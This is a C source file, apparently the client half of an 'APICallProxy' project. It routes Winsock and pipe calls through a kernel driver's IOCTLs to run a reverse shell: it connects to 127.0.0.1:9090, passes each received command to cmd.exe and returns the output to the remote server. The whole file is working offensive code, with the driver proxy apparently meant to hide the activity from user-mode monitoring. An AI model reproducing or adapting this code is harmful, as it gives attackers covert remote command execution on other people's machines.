#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h> 
#include <tchar.h>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>

#include <winioctl.h>


#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")

#define BUFSIZE 4096 
#define DEFAULT_BUFLEN 512

#pragma warning(disable : 4996)

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;


CHAR CommandResult[BUFSIZE * 100] = { 0 };

HANDLE hDevice = NULL;

VOID CreateChildProcess();
VOID WriteToPipe(CHAR* Buffer, int BufferLen);
VOID ReadFromPipe();

int _tmain(int argc, TCHAR* argv[])
{

    BOOL Status = 1;
    DWORD returned;
    WSAStartCleanUp  WSAInfo = { 0 };
    SocketStruct	 SocketInfo = { 0 };
    SendRecvStruct	 SendInfo = { 0 };
    BindStruct		 BindInfo = { 0 };
    AcceptStruct	 AcceptInfo = { 0 };
    ConnectStruct	 ConnectInfo = { 0 };

    hDevice = CreateFileA("\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, FALSE, OPEN_EXISTING, 0, FALSE);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed To Open Driver Error Code: 0x%x\n", GetLastError());
        return 0;
    }


    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSAStartup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to initiates Winsock Error Code: 0x%x\n", GetLastError());
        return 0;
    }

    printf("[+] initiates of the Winsock Successfully\n");


    SocketInfo.WSAStartCleanUpptr.WskDispatchPtr = WSAInfo.WskDispatchPtr;
    SocketInfo.WSAStartCleanUpptr.WskProviderPtr = WSAInfo.WskProviderPtr;
    SocketInfo.WSAStartCleanUpptr.WskRegistrationPtr = WSAInfo.WskRegistrationPtr;

#define WSK_FLAG_BASIC_SOCKET        0x00000000
#define WSK_FLAG_LISTEN_SOCKET       0x00000001
#define WSK_FLAG_CONNECTION_SOCKET   0x00000002
#define WSK_FLAG_DATAGRAM_SOCKET     0x00000004
#define WSK_FLAG_STREAM_SOCKET       0x00000008

    SocketInfo.Domain = AF_INET;
    SocketInfo.Flags = WSK_FLAG_CONNECTION_SOCKET;
    SocketInfo.Protocol = IPPROTO_TCP;
    SocketInfo.Type = SOCK_STREAM;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Socket, &SocketInfo, sizeof(SocketStruct), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed To Create Connection Socket Error Code: 0x%x\n", GetLastError());
        goto CleanUp;
    }

    printf("[+] Created Connection Socket Successfully\n");


    GetAddrInfoStruct AddrInfo = { 0 };
    struct addrinfo hints = { 0 };
    struct addrinfo* res;

    hints.ai_flags = AI_CANONNAME;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    CHAR Node[] = "127.0.0.1";
    CHAR Service[] = "9090";

    AddrInfo.Hints = &hints;
    AddrInfo.Result = &res;
    AddrInfo.Node = Node;
    AddrInfo.Service = Service;

    AddrInfo.SocketInfo.WskDispatchPtr = WSAInfo.WskDispatchPtr;
    AddrInfo.SocketInfo.WskProviderPtr = WSAInfo.WskProviderPtr;
    AddrInfo.SocketInfo.WskRegistrationPtr = WSAInfo.WskRegistrationPtr;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_GetAddrInfo, &AddrInfo, sizeof(GetAddrInfoStruct), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to Rsolve Server Addres Error Code: 0x%x\n", GetLastError());
        return 0;
    }

    printf("[+] Server Address Resolved Successfully\n");


    ConnectInfo.Socket = SocketInfo.Socket;
    ConnectInfo.AddrInfo = res;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Connect, &ConnectInfo, sizeof(ConnectStruct), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to Connect To Client Error Code: 0x%x\n", GetLastError());
        goto CleanUp;
    }

    printf("[+] Connected to Server Successfully\n");

    // Receive until the peer shuts down the connection or recieve exit command
    do {

        SendRecvStruct RecvInfo = { 0 };
        char RecvBuffer[DEFAULT_BUFLEN] = {0};
        RecvInfo.Socket = SocketInfo.Socket;
        RecvInfo.Buffer = RecvBuffer;
        RecvInfo.BufferLen = DEFAULT_BUFLEN;
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Recv, &RecvInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Recive Data From Server Side Error Code: 0x%x\n", GetLastError());
            break;
        }


        printf("[+] Server Command: %s\n", RecvBuffer);

        char Exit[] = "exit";
        if (!strcmp(RecvBuffer, Exit)) {

            printf("Exit the Session!!\n");
            break;
        }

        char newline[2] = { '\n' ,0x0 };
        strcat(RecvBuffer, newline);
        

        SECURITY_ATTRIBUTES saAttr;

        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
            printf("[-] Failed CreatePipe to write to child process Error Code %x\n", GetLastError()); ;


        if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
            printf("[-] Failed SetHandleInformation Error Code %x\n", GetLastError()); ;


        if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
            printf("[-] Failed CreatePipe to read from output from child process Error Code %x\n", GetLastError()); ;


        if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
            printf("[-] Failed SetHandleInformation Error Code %x\n", GetLastError());

        // Create the child process. 
        CreateChildProcess();

        //write command to child process
        WriteToPipe(RecvBuffer, strlen(RecvBuffer));

        //read command result from the child process
        ReadFromPipe();

        //send the command result to the seriver
        SendInfo.Socket = SocketInfo.Socket;
        SendInfo.Buffer = CommandResult;
        SendInfo.BufferLen = strlen(CommandResult);
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Send, &SendInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed to Replay to the Server Error Code: 0x%x\n", GetLastError());
            break;
        }

       
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &g_hChildStd_OUT_Rd, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Pipe handle Error Code: 0x%x\n", GetLastError());
        }

        Sleep(500);


    } while (1);


CleanUp:

    if (SocketInfo.Socket != NULL) {
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CloseSocket, &SocketInfo.Socket, sizeof(PVOID), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed Close Socket Error Code: 0x%x\n", GetLastError());
        }
    }

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSACleanup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed To Terminates use of the Winsock Error Code: 0x%x\n", GetLastError());
    }

    return 0;
}

VOID CreateChildProcess() {
    TCHAR szCmdline[] = TEXT("cmd.exe");
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    // Set up members of the PROCESS_INFORMATION structure. 

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDIN and STDOUT handles for redirection.

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process. 

    bSuccess = CreateProcess(NULL,
        szCmdline,     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION 

     // If an error occurs, exit the application. 
    if (!bSuccess)
        printf("[-] Failed Creating Process Error Code %x\n", GetLastError());
    else {

        DWORD returned;
        BOOL Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &piProcInfo.hProcess, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Process handle Error Code: 0x%x\n", GetLastError());
        }
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &piProcInfo.hThread, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Main Thread handle Error Code: 0x%x\n", GetLastError());
        }
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &g_hChildStd_OUT_Wr, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Pipe handle Error Code: 0x%x\n", GetLastError());
        }
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &g_hChildStd_IN_Rd, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed To Close Pipe handle Error Code: 0x%x\n", GetLastError());
        }

    }
}

VOID WriteToPipe(CHAR* Buffer, int BufferLen) {
    DWORD  dwWritten;
    BOOL bSuccess = FALSE;
    DWORD returned;
    BOOL Status;

    ReadWriteData PipeDate = { 0 };
    PipeDate.FileHandle = g_hChildStd_IN_Wr;
    PipeDate.DataLen = BufferLen;
    PipeDate.Data = Buffer;

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WRITEFILE, &PipeDate, sizeof(ReadWriteData), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed Writing Command To Pipe Error Code: 0x%x\n", GetLastError());
    }

    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &g_hChildStd_IN_Wr, sizeof(HANDLE), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed To Close Pipe handle Error Code: 0x%x\n", GetLastError());
    }
}

VOID ReadFromPipe() {
    DWORD dwRead;
    CHAR ResultTempBuffer[BUFSIZE] = { 0 };
    BOOL bSuccess = FALSE;
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    DWORD returned;
    BOOL Status;

    RtlZeroMemory(CommandResult, BUFSIZE * 100);

    for (;;){

        ReadWriteData PipeDate = { 0 };
        CHAR ResultTempBuffer[BUFSIZE] = { 0 };
        PipeDate.FileHandle = g_hChildStd_OUT_Rd;
        PipeDate.Data = ResultTempBuffer;
        PipeDate.DataLen = BUFSIZE;
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_READFILE, &PipeDate, sizeof(ReadWriteData), NULL, NULL, &returned, FALSE);
        if (!Status) {
            //Finished Reading CMD command output
            break;
        }
        Sleep(200);
        strcat(CommandResult, ResultTempBuffer);
    }


}
